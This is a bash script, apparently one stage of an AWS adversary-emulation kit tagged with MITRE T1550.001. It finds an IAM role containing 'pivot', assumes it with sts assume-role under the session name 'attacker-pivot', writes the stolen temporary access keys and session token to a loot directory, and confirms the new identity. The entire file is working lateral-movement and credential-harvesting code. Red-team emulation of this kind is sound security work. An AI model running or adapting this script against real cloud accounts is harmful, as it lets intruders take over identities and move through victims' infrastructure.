#!/usr/bin/env bash
# Stage 4 — Lateral Movement (T1550.001 Application Access Token)
# Assumes the pivot role the discovery stage found. The role's trust policy
# names the compromised user, so sts:AssumeRole succeeds and hands the attacker
# a fresh identity with a different permission set to continue from.
source "$(dirname "${BASH_SOURCE[0]}")/lib.sh"

phase "Stage 4 — Lateral Movement"

pivot_arn="$(cat "$LOOT_DIR/pivot_role_arn" 2>/dev/null || true)"
if [[ -z "$pivot_arn" ]]; then
  step "Pivot role not cached; re-discovering"
  pivot_arn="$(att iam list-roles \
    --query "Roles[?contains(RoleName, 'pivot')].Arn | [0]" --output text)"
fi

if [[ -z "$pivot_arn" || "$pivot_arn" == "None" ]]; then
  warn "No pivot role available — run 01-enumerate.sh first."
  exit 1
fi
ok "Assuming pivot role: $pivot_arn"

step "sts:AssumeRole into pivot identity"
creds="$(att sts assume-role \
  --role-arn "$pivot_arn" \
  --role-session-name "attacker-pivot" \
  --output json)"
echo "$creds" > "$LOOT_DIR/04-assumed-role-creds.json"

akid="$(echo "$creds" | grep -o '"AccessKeyId": *"[^"]*"' | head -1 | cut -d'"' -f4)"
step "Verifying new identity under assumed role"
AWS_ACCESS_KEY_ID="$akid" \
AWS_SECRET_ACCESS_KEY="$(echo "$creds" | grep -o '"SecretAccessKey": *"[^"]*"' | cut -d'"' -f4)" \
AWS_SESSION_TOKEN="$(echo "$creds" | grep -o '"SessionToken": *"[^"]*"' | cut -d'"' -f4)" \
  aws --region "$REGION" sts get-caller-identity --output json \
  | tee "$LOOT_DIR/04-pivot-identity.json"

ok "Lateral movement complete — now operating under the pivot role"
echo "MITRE: T1550.001 Application Access Token"
